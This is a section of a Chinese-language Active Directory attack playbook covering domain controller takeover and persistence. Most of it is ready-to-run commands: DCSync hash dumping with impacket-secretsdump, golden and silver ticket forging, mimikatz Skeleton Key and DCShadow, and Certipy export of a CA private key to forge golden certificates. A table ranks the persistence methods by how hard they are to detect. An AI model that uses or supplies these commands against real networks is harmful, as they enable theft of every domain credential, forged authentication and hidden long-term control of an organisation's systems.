## 九、域控接管与持久化

### 9.1 DCSync 与票据伪造（域控接管三连）

```bash
# 1. DCSync（需 Replicating Directory Changes 权限——域管/DC 默认具备）
impacket-secretsdump -just-dc-ntlm corp.local/administrator:pass@10.0.0.1
impacket-secretsdump -just-dc-user krbtgt corp.local/administrator:pass@10.0.0.1
# 2. 黄金票据（krbtgt + 域 SID → 伪造任意用户 TGT，有效期默认 10 年）
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain corp.local -aesKey AES administrator
# 3. 白银票据（服务级伪造，更隐蔽）
impacket-ticketer -nthash CIFS_HASH -domain-sid S-1-5-21-xxx -domain corp.local -spn cifs/dc.corp.local user
```
> **替代路径**：拿到 CA 私钥 → 铸造**黄金证书**（Golden Certificate，ADCS 领域"黄金票据"），比 krbtgt 更难被检测；2026 年证书攻击已从"模板漏洞"走向"密钥泄露"层面。

### 9.2 高级持久化（按隐蔽性排序）

| 持久化手段 | 原理 | 隐蔽性 | 检测难度 |
|-----------|------|-------|---------|
| ACL 后门 | 给指定账户写 DCSync/重置密码权限 | 高 | 高（需审计 ACL） |
| 黄金票据 | krbtgt 伪造 | 中 | 中（4769/异常票据） |
| 黄金证书 | CA 私钥铸造证书 | 极高 | 极高 |
| DCShadow | 注册临时 DC 写目录 | 高 | 高 |
| Skeleton Key | 域控 lsass 万能密码 | 中 | 低（lsass 内存检查） |
| AdminSDHolder/SDProp | 特权组保护对象持久化 | 高 | 高 |
| 混合身份后门 | 云端后门 Service Principal / 联邦域 | 高 | 高（云审计） |
| 计划任务/服务 | 常规后门 | 低 | 低 |

```bash
# Skeleton Key（域控内存万能密码，重启失效——短期持久化）
mimikatz # privilege::debug
mimikatz # misc::skeleton
# 任意用户用万能密码 mimikatz 登录
# DCShadow（注册影子 DC，写回目录对象，无需域管在线会话）
mimikatz # lsadump::dcshadow /object:user /attribute:userPassword /value:NewPass
# 黄金证书（Certipy）
certipy ca -ca 'CORP-CA' -backup -u administrator -p pass -dc-ip 10.0.0.1   # 导出 CA 私钥
certipy forge -ca-pfx ca.pfx -upn <EMAIL-REDACTED> -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

